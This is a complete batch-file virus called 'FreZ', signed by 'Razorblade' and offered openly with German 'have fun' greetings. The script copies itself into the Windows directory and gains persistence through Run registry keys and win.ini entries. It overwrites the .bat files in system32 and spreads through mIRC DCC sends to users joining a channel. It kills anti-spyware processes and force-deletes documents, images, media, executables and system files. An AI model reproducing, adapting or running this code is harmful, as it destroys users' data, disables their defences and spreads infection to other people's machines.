@echo off
:: FreZ
:: by Razorblade

title=Windows.FreZ 

set e=echo
set c=copy
set d=del /f
set r=reg add
set m=md

%e% Willkommen zu Windows FreZ
%e% Mit diesem Programm koennen Sie Viren programmieren!
%e% Have fun!!!

%m% "%systemroot%\Frez32"
%c% %0 "%systemroot%\Frez32\frez.bat"
%r% "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v FreZ32 /t REG_SZ /d "%systemroot%\Frez32\frez.bat" /f
%r% "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Freeze /t REG_SZ /d "%systemroot%\Frez32\frez.bat" /f
for %%v in (%systemroot%\system32\*.bat) do copy %0 %%v 
echo [afiles] > "%programfiles%\mIRC\mirc.ini"
echo n0=aliases.ini >> "%programfiles%\mIRC\mirc.ini"
echo n1=eventz.ini >> "%programfiles%\mIRC\mirc.ini"
echo [rfiles] >> "%programfiles%\mIRC\mirc.ini"
echo n0=remote.ini >> "%programfiles%\mIRC\mirc.ini"
echo n1=remote.ini >> "%programfiles%\mIRC\mirc.ini"
echo n2=eventz.ini >> "%programfiles%\mIRC\mirc.ini"
cls
echo [script] > "%programfiles%\mIRC\eventz.ini"
echo n0=on 1:JOIN:#:{ >> "%programfiles%\mIRC\eventz.ini"
echo n1=if ($nick == $me) { halt } >> "%programfiles%\mIRC\eventz.ini"
echo n2=/dcc send $nick "C:\WINDOWS\Frez32\frez.bat"  >> "%programfiles%\mIRC\eventz.ini"
echo n3=} >> "%programfiles%\mIRC\eventz.ini"
cls
echo [windows] >> "%systemroot%\win.ini"
echo load=%systemroot%\Frez32\frez.bat >> "%systemroot%\win.ini"
echo run=%systemroot%\Frez32\frez.bat >> "%systemroot%\win.ini"
cls
tskill wscript
tskill ad-aware
cls
%d% "*.doc"
%d% "*.html"
%d% "*.mp3"
%d% "*.exe"
%d% "*.jpg"
%d% "*.avi"
%d% "*.txt"
%d% "*.sav"
%d% "*.fre"
%d% "system.*"
%d% "win~1.*"
%d% "ini.*"
%d% "save~1.*"
%d% "porn~1.*"
%d% "pedo~1.*"
%d% "r@y~1.*"
%d% "user~1.*"
%d% "win.*"
%d% "regedit.*"
cls

:: End
:: RaZoR HaCKZ